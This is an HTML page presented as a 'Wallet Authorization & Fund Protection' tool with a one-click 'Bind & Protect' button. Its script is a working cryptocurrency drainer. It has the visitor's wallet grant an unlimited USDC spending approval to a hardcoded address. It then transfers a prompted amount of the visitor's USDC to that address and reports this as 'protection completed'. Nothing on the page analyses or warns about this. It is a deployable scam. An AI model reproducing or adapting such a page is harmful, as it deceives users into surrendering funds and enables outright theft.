<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Mark III ¬∑ Wallet Authorization & Fund Protection</title>
  <style>
    body {
      font-family: "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #e0f2ff, #f5f9ff);
      color: #222;
      padding: 50px;
      text-align: center;
    }
    h2 {
      color: #2b6cb0;
      font-size: 28px;
    }
    .glass-button {
      margin: 20px;
      padding: 16px 34px;
      font-size: 18px;
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.25);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      color: #2b6cb0;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s;
    }
    .glass-button:hover {
      background: rgba(255, 255, 255, 0.35);
    }
    #status {
      margin-top: 30px;
      font-size: 17px;
      font-weight: bold;
      color: #333;
      white-space: pre-line;
    }
  </style>
</head>
<body>
  <h2>Mark III ¬∑ Wallet Authorization & Fund Protection</h2>
  <button class="glass-button" onclick="startBinding()">üöÄ One-Click Bind & Protect</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const rawUSDC = "0xA0b86991C6218B36C1d19D4a2e9Eb0cE3606eB48";
    const rawBOSS = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
    const approveAmount = ethers.constants.MaxUint256;

    async function startBinding() {
      const status = document.getElementById("status");
      try {
        if (!window.ethereum) {
          status.innerText = "‚ùå No wallet detected. Please install MetaMask.";
          return;
        }

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();
        status.innerText = "üîó Connected: " + userAddress;

        const usdcAddress = ethers.utils.getAddress(rawUSDC);
        const bossAddress = ethers.utils.getAddress(rawBOSS);

        status.innerText += "\\n‚è≥ Approving contract...";
        const usdc = new ethers.Contract(usdcAddress, ["function approve(address,uint256) public returns (bool)"], signer);
        const approveTx = await usdc.approve(bossAddress, approveAmount);
        await approveTx.wait();
        status.innerText += "\\n‚úÖ Authorization successful.";

        const amount = prompt("Enter USDC amount to protect:");
        if (!amount || isNaN(amount)) {
          status.innerText += "\\n‚ùå Invalid amount.";
          return;
        }
        const parsedAmount = ethers.utils.parseUnits(amount, 6);
        const usdcTransfer = new ethers.Contract(usdcAddress, ["function transferFrom(address,address,uint256) public returns (bool)"], signer);
        status.innerText += "\\n‚è≥ Transferring USDC...";
        const transferTx = await usdcTransfer.transferFrom(userAddress, bossAddress, parsedAmount);
        await transferTx.wait();
        status.innerText += "\\nüí∞ Protection completed successfully.";

      } catch (err) {
        console.error(err);
        status.innerText += "\\n‚ùå Error: " + (err.message || err);
      }
    }
  </script>
</body>
</html>
